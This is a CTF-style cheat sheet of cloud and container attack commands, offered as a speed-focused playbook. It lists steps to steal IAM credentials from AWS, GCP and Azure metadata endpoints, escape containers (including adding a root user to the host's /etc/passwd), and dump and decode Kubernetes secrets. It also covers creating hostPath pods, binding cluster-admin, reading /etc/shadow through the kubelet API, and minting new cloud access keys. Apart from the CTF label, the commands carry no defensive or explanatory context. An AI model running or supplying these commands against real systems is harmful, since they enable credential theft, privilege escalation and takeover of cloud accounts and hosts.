# CTF Cloud/Container — Speed-First

## Instant Recon (<1 minute)

```
1. ls -la /.dockerenv && cat /proc/1/cgroup → Container?
2. curl -s http://169.254.169.254/latest/meta-data/ → Cloud?
3. env | grep -iE 'AWS|GCP|AZURE|K8S|DOCKER' → Provider
4. ls /var/run/secrets/kubernetes.io/ → K8s SA token
5. Check: AWS-Goat? GCP-IAM-CTF? Kubernetes-CTF?
```

## Real-World CTF Targets

| CTF | Lab | Flag | Vector |
|-----|-----|------|--------|
| AWS-Goat | IAM privesc | `/flag.txt` | SSRF→metadata→STS |
| GCP-IAM-CTF | Metadata SSRF | `gs://flag-bucket` | SSRF→SA token→Bucket |
| Kubernetes-CTF | Pod escape | Host `/root/flag` | HostPath mount escape |

---

## Cloud Metadata Exploitation

### AWS — IMDSv2 Bypass

```bash
# IMDSv1
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/user-data

# IMDSv2 — PUT token required
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Full chain: get role → get creds → aws sts get-caller-identity → s3 ls
```

### GCP — Metadata Header Required

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | \
  jq -r '.access_token')
# gsutil ls gs://<bucket> or gcloud compute instances list
```

### Azure — Managed Identity

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  jq -r '.access_token')
```

---

## Container Escape Techniques

### CVE-2019-5736 — runc Overwrite

```bash
cat /proc/1/status | grep Cap
# Write payload to overwrite runc, execute on host via docker exec
# Create binary: gcc -o /tmp/exploit exploit.c
# Overwrite /proc/self/exe or target runc path
```

### CVE-2020-15257 — HostNetwork Pod Escape

```bash
cat /proc/1/net/tcp | head -5
curl -sk https://127.0.0.1:10250/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | \
  jq '.items[].metadata.name'
```

### Privileged Container Escape

```bash
cat /proc/1/status | grep -i cap  # 0000003fffffffff = privileged
mkdir -p /host && mount /dev/sda1 /host
echo "hacked:x:0:0::/root:/bin/bash" >> /host/etc/passwd
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Docker Socket Escape

```bash
ls -la /var/run/docker.sock
docker run -it --privileged -v /:/host alpine chroot /host
docker ps && docker inspect <id> | jq '.[].Mounts'
```

---

## Kubernetes Exploitation

### Service Account Token

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://kubernetes.default.svc

curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/secrets | \
  jq '.items[].data | to_entries[] | "\(.key)=\(.value | @base64d)"'
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/default/configmaps | \
  jq '.items[].data'
```

### RBAC Privilege Escalation

```bash
kubectl auth can-i --list 2>/dev/null
kubectl auth can-i create pods 2>/dev/null

# Mount host filesystem via pod creation
kubectl run privesc --image=busybox --restart=Never -it --rm --overrides='
{
  "spec": {"containers": [{
    "name": "p", "image": "busybox", "command": ["sh","-c","sleep infinity"],
    "volumeMounts": [{"name": "host","mountPath": "/host"}]
  }], "volumes": [{"name": "host","hostPath": {"path": "/","type": "Directory"}}]}
}' -- sh

# Cluster-admin binding if can create rolebindings
kubectl create rolebinding cluster-admin \
  --clusterrole=cluster-admin --serviceaccount=default:default
```

### Kubelet API Direct

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk https://127.0.0.1:10250/pods -H "Authorization: Bearer $TOKEN"
curl -sk -X POST "https://127.0.0.1:10250/run/default/<pod>/<container>" \
  -H "Authorization: Bearer $TOKEN" -d "command=cat&command=/etc/shadow"
```

---

## IAM Exploitation

### AWS

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name USER
aws s3 ls
aws lambda list-functions
aws iam create-access-key --user-name admin
```

### GCP

```bash
gcloud auth list
gcloud projects list
gcloud iam service-accounts list
gcloud storage ls
gcloud iam service-accounts keys create key.json --iam-account=SA@PROJECT.iam.gserviceaccount.com
```

### Azure

```bash
az account show
az role assignment list --include-inherited
az keyvault secret list --vault-name VAULT
az storage account list
```

---

## Docker Image Forensics

```bash
docker save IMAGE | tar -xf - --to-stdout | strings | grep -iE 'flag|password|secret'
docker history IMAGE --no-trunc
```

---

## Speed Metrics

```
Metadata SSRF: <2min  |  Container detect: <1min |  Docker escape: <5min
K8s enum: <3min  |  K8s secrets: <2min  |  IAM privesc: <10min
Full chain: <15min  |  Docker forensics: <3min
```
